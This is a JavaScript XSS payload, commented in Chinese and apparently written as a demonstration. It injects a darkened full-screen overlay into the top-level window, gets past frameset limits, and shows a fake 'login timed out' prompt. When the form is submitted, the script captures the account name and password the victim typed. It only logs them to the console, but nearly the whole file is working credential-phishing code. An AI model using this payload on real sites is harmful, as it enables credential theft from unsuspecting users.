(function() {
    // 建立全螢幕黑色半透明背景遮罩（透過 top.document 確保掛載至最外層視窗）
    var overlay = top.document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100vw';
    overlay.style.height = '100vh';
    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
    overlay.style.zIndex = '9999';
    overlay.style.display = 'flex';
    overlay.style.justifyContent = 'center';
    overlay.style.alignItems = 'center';

    // 建立正中央的偽造登入視窗
    overlay.innerHTML = `
        <div style="background: white; padding: 30px; border-radius: 8px; width: 320px; text-align: center; font-family: sans-serif; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
            <h3 style="color: #ff3333; margin-top: 0; font-size: 20px;">⚠️ 系統提示</h3>
            <p style="color: #666; font-size: 14px; margin-bottom: 20px;">您的登入已逾時，請重新輸入密碼以驗證身分。</p>
            <input type="text" id="fake_user" placeholder="帳號 / 電子郵件" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
            <input type="password" id="fake_pass" placeholder="密碼" style="width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;">
            <button id="fake_submit" style="width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">確認登入</button>
        </div>
    `;

    // 強制附加至最外層 top 的 body 避開 frameset 限制
    top.document.body.appendChild(overlay);

    // 透過 overlay.querySelector 尋找按鈕與輸入框，避免在 frameset 中抓錯元素
    overlay.querySelector('#fake_submit').addEventListener('click', function() {
        var user = overlay.querySelector('#fake_user').value;
        var pass = overlay.querySelector('#fake_pass').value;
        console.log("【XSS 模擬成功】讀取到帳密：", { account: user, password: pass });
        overlay.remove(); // 關閉視窗
    });
})();
